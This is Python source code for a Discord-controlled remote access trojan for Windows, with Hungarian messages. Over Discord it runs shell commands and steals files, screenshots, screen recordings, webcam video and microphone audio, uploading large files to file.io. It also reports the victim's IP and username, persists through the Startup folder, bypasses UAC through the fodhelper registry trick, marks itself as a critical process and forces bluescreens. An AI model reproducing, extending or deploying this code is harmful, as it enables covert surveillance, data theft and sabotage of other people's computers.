# -*- coding: utf-8 -*-
import os
import sys
import ssl
import random
import threading
import time
import requests
import platform
import ctypes
import asyncio
import tkinter as tk
from tkinter import messagebox
import win32gui
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import PIL
import winreg
import discord
from discord import Intents
from discord.ext import commands
from discord.ext import commands
from discord.ext.commands import MissingPermissions
import cv2
import datetime
from ctypes import *
import urllib.request
import json
if (sys.argv[0].endswith("exe")):
    import cv2
token = ''
global isexe
isexe=False
if (sys.argv[0].endswith("exe")):
    isexe=True
global appdata
global temp
appdata = os.getenv('APPDATA')
temp= os.getenv('temp')
intents = Intents.all()
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix='!', intents=intents)
ssl._create_default_https_context = ssl._create_unverified_context
helpmenu = """
Elérhető parancsok :
-->!message - Kiír valamit egy szövegdobozba. Pl.: !message Szia
-->!shell - Valamilyen CMD-s parancs futtatása
-->!voice - Kimond a gép hangosan valamit mint a Google Fordító. Pl.: !voice Sziasztok
-->!download - Letölt egy fájlt a gépről és elküldi ide
-->!upload - Fájl küldése a gépre
-->!wallpaper - Kicseréli a háttérképet
-->!volumemax - Hangot maxra
-->!volumezero - Hangot nullára
-->!screenshot - Csinál egy screenshotot
-->!shutdown - Kikapcsolja a gépet
-->!restart - Újraindítja a gépet
-->!logoff - Kijelentkezik a gépből
-->!bluescreen - kékhalál
-->!recscreen - Felveszi a képernyőt videóra egy bizonyos másodpercig. Pl.: !recscreen 10
-->!recaudio - ugyanúgy mint a felsőt csak hangot vesz fel
-->!audio - Lejátszik egy hangot(csak .wav fájlt lehet). Pl.: !audio hang.wav
-->!reccam - Felvesz a kamerával videót valamennyi másodpercig. Pl.: !reccam 10
-->!webcampic - Csinál egy képet
-->!sysinfo - Információ a gépről
-->!cd - Megváltoztatni az útvonalat
-->!currentdir - Jelenlegi mappa
-->!windowstart - Log indítása
-->!windowstop - Log leállítása
-->!admincheck - Admin ellenőrzése
-->!displayoff - Képernyő kikapcsolása
-->!displayon - Képernyő bekapcsolása
-->!critproc - Kritikus folyamattá alakítás. Tehát ha a task managerből kikapcsolják akkor a gép kékhalált kap
-->!uncritproc - Kritikus folyamat kikapcsolása
-->!startup - Berakni autómata indításra
-->!website - Felmegy egy websitera. Pl.: !website www.google.com
-->!blockinput - Blockolni a billentyűzetet
-->!unblobkinput - Feloldani a billentyűzetet
-->!youareanidiot - Feladja a Buta vagy? kérdést
-->!mail - Előhozza egy beviteli mezőt amibe ha beírunk valamit elküldi
-->!prockill - Program bezárása név szerint. Pl.: !prockill chrome.exe
-->!proclist - Kiírja a gépen futó összes programot/folyamatot
-->!uacbypass - Megkerüli admin jogosultságot szerezni
"""
if not (sys.argv[0].endswith("exe")):
    helpmenu+='-->!reccam - Felvesz a kamerával videót valamennyi másodpercig. Pl.: !reccam 10'
    helpmenu+='\n-->!webcampic - Csinál egy képet'
async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await client.change_presence(status=discord.Status.online, activity=window_displayer)
        time.sleep(1)

def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()

def start():
    import ctypes
    import os
    import sys
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:  
        path = sys.argv[0]
        isexe=False
        if (sys.argv[0].endswith("exe")):
            isexe=True
        if isexe:
            os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y' )
        else:
            os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
            e = r"""
    Set     objShell = WScript.CreateObject("WScript.Shell")
    objS    hell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
    """.    format(os.path.basename(sys.argv[0]))
            with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                f.write(e)
                f.close()

@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    total = []
    global number
    number = 1
    global channel_name
    channel_name = None
    for x in client.get_all_channels(): 
        total.append(x.name)
    for y in range(len(total)):
        if total[y].startswith("session"):
            import re
            result = [e for e in re.split("[^0-9]", total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass  
    channel_name = f"session-{number}"
    newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: Új munkamenet megnyitva {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | Felhasználó : {os.getlogin()} | IP: {ip}"
    if is_admin == True:
        await channel.send(f'{value1} | admin!')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Az ablaknaplózás leállt")
    await client.change_presence(status=discord.Status.online, activity=game)
    start()

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
def critproc():
    import ctypes
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def uncritproc():
    import ctypes
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

def play_sound(sound_file):
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load(sound_file)
    pygame.mixer.music.play()

def send_to_discord(input_text):
    channel = client.get_channel(1232352855562915881)
    asyncio.ensure_future(channel.send(input_text))

sound_file = "idiot.mp3"

@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        total = []
        for x in client.get_all_channels(): 
            total.append(x.name)
        try:
            if message.content == "!screenshot":
                import os
                from mss import mss
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
                path = (os.getenv('TEMP')) + r"\monitor.png"
                file = discord.File((path), filename="monitor.png")
                await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
                os.remove(path)

            if message.content == "!volumemax":
                volumeup()
                await message.channel.send("[*] A hangerő 100%")

            if message.content == "!volumezero":
                volumedown()
                await message.channel.send("[*] A hangerő 0%")

            if message.content == "!webcampic":
                import os
                import time
                import cv2
                temp = (os.getenv('TEMP'))
                camera_port = 0
                camera = cv2.VideoCapture(camera_port)
                time.sleep(0.1)
                return_value, image = camera.read()
                cv2.imwrite(temp + r"\temp.png", image)
                del(camera)
                file = discord.File(temp + r"\temp.png", filename="temp.png")
                await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
            if message.content.startswith("!message"):
                import ctypes
                import time
                MB_YESNO = 0x04
                MB_HELP = 0x4000
                ICON_STOP = 0x10
                def mess():
                    ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
                import threading
                messa = threading.Thread(target=mess)
                messa._running = True
                messa.daemon = True
                messa.start()
                import win32con
                import win32gui
                def get_all_hwnd(hwnd,mouse):
                    def winEnumHandler(hwnd, ctx):
                        if win32gui.GetWindowText(hwnd) == "Error":
                            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                            win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                            win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                            return None
                        else:
                            pass
                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                win32gui.EnumWindows(get_all_hwnd, 0)

            if message.content.startswith("!wallpaper"):
                import ctypes
                import os
                path = os.path.join(os.getenv('TEMP') + r"\temp.jpg")
                await message.attachments[0].save(path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                await message.channel.send("[*] A parancs sikeresen lefutott")

            if message.content.startswith("!upload"):
                await message.attachments[0].save(message.content[8:])
                await message.channel.send("[*] A parancs sikeresen lefutott")

            if message.content.startswith("!shell"):
                global status
                status = None
                import subprocess
                import os
                instruction = message.content[7:]
                def shell(command):
                    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    status = "ok"
                    return output.stdout.decode('CP437').strip()
                out = shell(instruction)
                print(out)
                print(status)
                if status:
                    numb = len(out)
                    if numb < 1:
                        await message.channel.send("[*] A parancsot nem ismerhető fel, vagy nem kapott kimenetet")
                    elif numb > 1990:
                        temp = (os.getenv('TEMP'))
                        f1 = open(temp + r"\output.txt", 'a')
                        f1.write(out)
                        f1.close()
                        file = discord.File(temp + r"\output.txt", filename="output.txt")
                        await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
                        os.remove(temp + r"\output.txt")
                    else:
                        await message.channel.send("[*] A parancs sikeresen lefutott : " + out)
                else:
                    await message.channel.send("[*] A parancsot nem ismerhető fel, vagy nem kapott kimenetet")
                    status = None

            if message.content.startswith("!download"):
                import subprocess
                import os
                filename=message.content[10:]
                check2 = os.stat(filename).st_size
                if check2 > 7340032:
                    import requests
                    await message.channel.send("ez eltarthat egy ideig, mert a fájl több mint 8 MB. Kérlek várj")
                    response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
                    await message.channel.send("download link: " + response)
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                else:
                    file = discord.File(message.content[10:], filename=message.content[10:])
                    await message.channel.send("[*] A parancs sikeresen lefutott", file=file)

            if message.content.startswith("!cd"):
                import os
                os.chdir(message.content[4:])
                await message.channel.send("[*] A parancs sikeresen lefutott")

            if message.content == "!help":
                import os
                temp = (os.getenv('TEMP'))
                f5 = open(temp + r"\helpmenu.txt", 'a', encoding="utf-8")
                f5.write(str(helpmenu))
                f5.close()
                temp = (os.getenv('TEMP'))
                file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
                await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
                os.remove(temp + r"\helpmenu.txt")
            if message.content == "!sysinfo":
                import platform
                jak = str(platform.uname())
                intro = jak[12:]
                from requests import get
                ip = get('https://api.ipify.org').text
                pp = "IP Address = " + ip
                await message.channel.send("[*] A parancs sikeresen lefutott : " + intro + pp)
            if message.content == "!admincheck":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    await message.channel.send("[*] Gratulálok Admin vagy")
                elif is_admin == False:
                    await message.channel.send("[!] Nem vagy Admin")
            if message.content.startswith("!voice"):
                volumeup()
                import win32com.client as wincl
                speak = wincl.Dispatch("SAPI.SpVoice")
                speak.Speak(message.content[7:])
                await  message.channel.send("[*] A parancs sikeresen lefutott")       
            if message.content == "!shutdown":
                import os
                uncritproc()
                os.system("shutdown /p")
                await message.channel.send("[*] A parancs sikeresen lefutott")
            if message.content.startswith("!blockinput"):
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    ok = windll.user32.BlockInput(True)
                    await message.channel.send("[*] and successfuly executed")
                else:
                    await message.channel.send("[!] Ehhez a művelethez rendszergazdai jogok szükségesek")
            if message.content.startswith("!unblockinput"):
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    ok = windll.user32.BlockInput(False)
                    await  message.channel.send("[*] A parancs sikeresen lefutott")
            if message.content == "!startup":
                import ctypes
                import os
                import sys
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:  
                    path = sys.argv[0]
                    isexe=False
                    if (sys.argv[0].endswith("exe")):
                        isexe=True
                    if isexe:
                        os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y' )
                    else:
                        os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
                        e = r"""
    Set     objShell = WScript.CreateObject("WScript.Shell")
    objS    hell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
    """.    format(os.path.basename(sys.argv[0]))
                        with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                            f.write(e)
                            f.close()
                    await message.channel.send("[*] A parancs sikeresen lefutott")  
                else:
                    await message.channel.send("[*] Ez a parancs rendszergazdai jogosultságokat igényel")
            if message.content == "!restart":
                import os
                uncritproc()
                os.system("shutdown /r /t 00")
                await message.channel.send("[*] A parancs sikeresen lefutott")

            if message.content == "!logoff":
                import os
                uncritproc()
                os.system("shutdown /l /f")
                await message.channel.send("[*] A parancs sikeresen lefutott")

            if message.content == "!bluescreen":
                import ctypes
                import ctypes.wintypes
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
            if message.content == "!currentdir":
                import subprocess as sp
                output = sp.getoutput('cd')
                await message.channel.send("[*] A parancs sikeresen lefutott")
                await message.channel.send("output is : " + output)
            if message.content.startswith("!recscreen"):
                import cv2
                import numpy as np
                import pyautogui
                reclenth = float(message.content[10:])
                input2 = 0
                while True:
                    input2 = input2 + 1
                    input3 = 0.045 * input2
                    if input3 >= reclenth:
                        break
                    else:
                        continue
                import os
                SCREEN_SIZE = (1920, 1080)
                fourcc = cv2.VideoWriter_fourcc(*"XVID")
                temp = (os.getenv('TEMP'))
                videeoo = temp + r"\output.avi"
                out = cv2.VideoWriter(videeoo, fourcc, 20.0, (SCREEN_SIZE))
                counter = 1
                while True:
                    counter = counter + 1
                    img = pyautogui.screenshot()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)
                    if counter >= input2:
                        break
                out.release()
                import subprocess
                import os
                temp = (os.getenv('TEMP'))
                check = temp + r"\output.avi"
                check2 = os.stat(check).st_size
                if check2 > 7340032:
                    import requests
                    await message.channel.send("ez eltarthat egy ideig, mert a fájl több mint 8 MB. Kérlek várj")
                    boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                    await message.channel.send("videó letöltési link: " + boom)
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                    os.system(r"del %temp%\output.avi /f")
                else:
                    file = discord.File(check, filename="output.avi")
                    await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
                    os.system(r"del %temp%\output.avi /f")
            if message.content.startswith("!reccam"):
                import cv2
                import numpy as np
                import pyautogui
                input1 = float(message.content[8:])
                import cv2
                import os
                temp = (os.getenv('TEMP'))
                vid_capture = cv2.VideoCapture(0)
                vid_cod = cv2.VideoWriter_fourcc(*'mp4v')
                loco = temp + r"\output.mp4"
                output = cv2.VideoWriter(loco, vid_cod, 20.0, (640,480))
                input2 = 0
                while True:
                    input2 = input2 + 1
                    input3 = 0.045 * input2
                    ret,frame = vid_capture.read()
                    output.write(frame)
                    if input3 >= input1:
                        break
                    else:
                        continue
                vid_capture.release()
                output.release()
                import subprocess
                import os
                temp = (os.getenv('TEMP'))
                check = temp + r"\output.mp4"
                check2 = os.stat(check).st_size
                if check2 > 7340032:
                    import requests
                    await message.channel.send("ez eltarthat egy ideig, mert a fájl több mint 8 MB. Kérlek várj")
                    boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                    await message.channel.send("videó letöltési link: " + boom)
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                    os.system(r"del %temp%\output.mp4 /f")
                else:
                    file = discord.File(check, filename="output.mp4")
                    await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
                    os.system(r"del %temp%\output.mp4 /f")
            if message.content.startswith("!recaudio"):
                import cv2
                import numpy as np
                import pyautogui
                import os
                import sounddevice as sd
                from scipy.io.wavfile import write
                seconds = float(message.content[10:])
                temp = (os.getenv('TEMP'))
                fs = 44100
                laco = temp + r"\output.wav"
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                sd.wait()
                write(laco, fs, myrecording)
                import subprocess
                import os
                temp = (os.getenv('TEMP'))
                check = temp + r"\output.wav"
                check2 = os.stat(check).st_size
                if check2 > 7340032:
                    import requests
                    await message.channel.send("ez eltarthat egy ideig, mert a fájl több mint 8 MB. Kérlek várj")
                    boom = requests.post('https://file.io/', files={"file": open(check, "rb")}).json()["link"]
                    await message.channel.send("videó letöltési link: " + boom)
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                    os.system(r"del %temp%\output.wav /f")
                else:
                    file = discord.File(check, filename="output.wav")
                    await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
                    os.system(r"del %temp%\output.wav /f")
            if message.content.startswith("!audio"):
                import os
                temp = (os.getenv("TEMP"))
                temp = temp + r"\audiofile.wav"
                if os.path.isfile(temp):
                    delelelee = "del " + temp + r" /f"
                    os.system(delelelee)
                temp1 = (os.getenv("TEMP"))
                temp1 = temp1 + r"\sounds.vbs"
                if os.path.isfile(temp1):
                    delelee = "del " + temp1 + r" /f"
                    os.system(delelee)                
                await message.attachments[0].save(temp)
                temp2 = (os.getenv("TEMP"))
                f5 = open(temp2 + r"\sounds.vbs", 'a')
                result = """ Dim oPlayer: Set oPlayer = CreateObject("WMPlayer.OCX"): oPlayer.URL = """ + '"' + temp + '"' """: oPlayer.controls.play: While oPlayer.playState <> 1 WScript.Sleep 100: Wend: oPlayer.close """
                f5.write(result)
                f5.close()
                os.system(r"start %temp%\sounds.vbs")
                await message.channel.send("[*] A parancs sikeresen lefutott")
            #if adding startup n stuff this needs to be edited to that
            if message.content == "!displayoff":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    import ctypes
                    WM_SYSCOMMAND = 274
                    HWND_BROADCAST = 65535
                    SC_MONITORPOWER = 61808
                    ctypes.windll.user32.BlockInput(True)
                    ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                else:
                    await message.channel.send("[!] Admin jog szükséges a parancs futtatásához")
            if message.content == "!displayon":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    from pynput.keyboard import Key, Controller
                    keyboard = Controller()
                    keyboard.press(Key.esc)
                    keyboard.release(Key.esc)
                    keyboard.press(Key.esc)
                    keyboard.release(Key.esc)
                    ctypes.windll.user32.BlockInput(False)
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                else:
                    await message.channel.send("[!] Admin jog szükséges a parancs futtatásához")
            if message.content == "!critproc":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    critproc()
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                else:
                    await message.channel.send(r"[*] Nem vagy admin :(")
            if message.content == "!uncritproc":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    uncritproc()
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                else:
                    await message.channel.send(r"[*] Nem vagy admin :(")
            if message.content.startswith("!website"):
                import subprocess
                website = message.content[9:]
                def OpenBrowser(URL):
                    if not URL.startswith('http'):
                        URL = 'http://' + URL
                    subprocess.call('start ' + URL, shell=True) 
                OpenBrowser(website)
                await message.channel.send("[*] A parancs sikeresen lefutott")
            if message.content == "!youareanidiot":

                def yes():
                    ablak.destroy()
                    messagebox.showinfo("Jó válasz!", "Igazad van!")
                    message.channel.send("[*] A felhasználó az IGEN válaszra kattintott, ezért nem kapott kékhalált a számítógép")

                def no():
                    import time
                    ablak.destroy()
                    message.channel.send("[*] A felhasználó az NEM válaszra kattintott, ezért kékhalált fog kapni a számítógép")
                    play_sound(sound_file)
                    time.sleep(6)
                    blue()


                def blockinput():
                    import ctypes
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    if is_admin == True:
                        ok = windll.user32.BlockInput(True)

                def blue():
                    import ctypes
                    import ctypes.wintypes
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

                ablak = tk.Tk()
                ablak.title("Kérdés")
                ablak.geometry("350x250")

                def disable_event():
                    pass

                ablak.protocol("WM_DELETE_WINDOW", disable_event)
                blockinput()

                kerdes = tk.Label(ablak, text="Buta vagy?", font="Ariel 20")
                kerdes.pack()

                igen_gomb = tk.Button(ablak, text="Igen", command=yes, width=20, height=5, bg="green")
                igen_gomb.pack()

                nem_gomb = tk.Button(ablak, text="Nem", command=no, width=20, height=5, bg="red")
                nem_gomb.pack()

                await message.channel.send("[*] A parancs sikeresen lefutott")

                ablak.mainloop()

            if message.content == "!mail":
                window = tk.Tk()
                window.title("Üzenet")

                def send_to_webhook():
                    input_text = entry.get()
                    if input_text:
                        send_to_discord(input_text)
                        entry.delete(0, tk.END)
                        window.destroy()

                label=tk.Label(text="Sziasztok mi vagyuk a múlt osztály, ide írhattok üzenetet és elküldhetitek nekünk.", font="Ariel 20")
                label.pack(pady=10)

                # Beviteli mező létrehozása
                entry = tk.Entry(window, width=40, bd=2)
                entry.pack(pady=10)

                # Küldés gomb létrehozása
                send_button = tk.Button(window, text="Küldés", command=send_to_webhook)
                send_button.pack()

                await message.channel.send("[*] A parancs sikeresen lefutott")

                window.mainloop()
            if message.content == "!minesweeper":
                import sys, string, os
                await message.channel.send("[*] A parancs sikeresen lefutott")
                os.system("python main.py")
            if message.content.startswith("!prockill"):  
                import os
                proc = message.content[10:]
                kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f"
                import time
                import os
                import subprocess   
                os.system(kilproc)
                import subprocess
                time.sleep(2)
                process_name = proc
                call = 'TASKLIST', '/FI', 'imagename eq %s' % process_name
                output = subprocess.check_output(call).decode()
                last_line = output.strip().split('\r\n')[-1]
                done = (last_line.lower().startswith(process_name.lower()))
                if done == False:
                    await message.channel.send("[*] A parancs sikeresen lefutott")
                elif done == True:
                    await message.channel.send('[*] A parancs nem megfelelően futott le')
            if message.content == "!proclist":
                import os
                import subprocess
                if 1==1:
                    result = subprocess.getoutput("tasklist")
                    numb = len(result)
                    if numb < 1:
                        await message.channel.send("[*] A parancs nem ismerhető fel, vagy nem kapott kimenetet")
                    elif numb > 1990:
                        temp = (os.getenv('TEMP'))
                        if os.path.isfile(temp + r"\output.txt"):
                            os.system(r"del %temp%\output.txt /f")
                        f1 = open(temp + r"\output.txt", 'a')
                        f1.write(result)
                        f1.close()
                        file = discord.File(temp + r"\output.txt", filename="output.txt")
                        await message.channel.send("[*] A parancs sikeresen lefutott", file=file)
                    else:
                        await message.channel.send("[*] A parancs sikeresen lefutott : " + result)    
            if message.content == "!uacbypass":
                import winreg
                import ctypes
                import sys
                import os
                import time
                import inspect
                def isAdmin():
                    try:
                        is_admin = (os.getuid() == 0)
                    except AttributeError:
                        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                    return is_admin
                if isAdmin():
                    await message.channel.send("Már admin vagy!")
                else:
                    class disable_fsr():
                        disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                        revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                        def __enter__(self):
                            self.old_value = ctypes.c_long()
                            self.success = self.disable(ctypes.byref(self.old_value))
                        def __exit__(self, type, value, traceback):
                            if self.success:
                                self.revert(self.old_value)
                    await message.channel.send("Megpróbálunk ADMIN jogot szerezni!")
                    isexe=False
                    if (sys.argv[0].endswith("exe")):
                        isexe=True
                    if not isexe:
                        test_str = sys.argv[0]
                        current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                        cmd2 = current_dir
                        create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                        os.system(create_reg_path)
                        create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                        os.system(create_trigger_reg_key) 
                        create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                        os.system(create_payload_reg_key)
                    else:
                        test_str = sys.argv[0]
                        current_dir = test_str
                        cmd2 = current_dir
                        create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                        os.system(create_reg_path)
                        create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                        os.system(create_trigger_reg_key) 
                        create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                        os.system(create_payload_reg_key)
                    with disable_fsr():
                        os.system("fodhelper.exe")  
                    time.sleep(2)
                    remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
                    os.system(remove_reg)
            if message.content == "!windowstart":
                import threading
                global stop_threads
                stop_threads = False
                global _thread
                _thread = threading.Thread(target=between_callback, args=(client,))
                _thread.start()
                await message.channel.send("[*] Elindult az ablaknaplózás ehhez a munkamenethez")

            if message.content == "!windowstop":
                stop_threads = True
                await message.channel.send("[*] A munkamenet ablaknaplózása leállt")
                game = discord.Game(f"Az ablaknaplózás leállt")
                await client.change_presence(status=discord.Status.online, activity=game)
        except Exception as e:
            await message.channel.send(f"[*] Hiba történt: {e}")
client.run(token)